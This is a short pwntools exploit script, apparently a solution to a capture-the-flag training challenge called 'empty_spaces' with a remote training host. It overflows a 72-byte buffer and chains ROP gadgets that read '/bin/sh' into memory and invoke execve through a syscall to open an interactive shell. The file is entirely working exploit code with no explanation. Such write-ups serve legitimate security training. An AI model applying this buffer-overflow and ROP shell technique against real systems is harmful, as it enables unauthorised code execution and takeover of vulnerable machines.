from pwn import *

CHALL_PATH = './empty_spaces'
CHALL = ELF(CHALL_PATH)
rop = ROP(CHALL)

# Gadgets
POP_RDI_RET = 0x00000000004787b3
POP_RSI_RET = 0x0000000000477d3d
POP_RAX_RET = 0x000000000042146b
POP_RBX_RET = 0x0000000000471a37
SYSCALL = 0x0000000000442be1
READ = 0x0000000000419630
MAIN = 0x0000000000401922
BINSH = 0x4aa000
XOR_RDX = 0x00000000004677ac


context.arch = "amd64"

if args.GDB:
    p = gdb.debug(CHALL_PATH, '''
        b *0x00000000004787b3
        c
    ''')
    
elif args.REMOTE:
    p = remote('empty-spaces.training.offensivedefensive.it', 8080, ssl = True)
    
else:
    p = process(CHALL_PATH)
    
    
# Overflow the buffer
payload = b'A' * 72 # found with cyclic

# Idea: execve('/bin/sh', 0, 0)
# beginning of the rop chain
payload += p64(POP_RDI_RET)
payload += p64(0x0) # stdin
payload += p64(POP_RSI_RET)
payload += p64(BINSH)
payload += p64(READ)
payload += p64(MAIN)
payload += p64(0x0)

input('Press enter to send the payload')
p.send(payload)

input('Press enter to send the payload')
p.send(b'/bin/sh\0')


payload = b'A' * 72
payload += p64(XOR_RDX)
payload += p64(POP_RDI_RET)
payload += p64(BINSH)
payload += p64(POP_RSI_RET)
payload += p64(0x0)
payload += p64(POP_RAX_RET)
payload += p64(0x3b)
payload += p64(SYSCALL)

input('Press enter to send the payload')
p.send(payload)
    
p.interactive()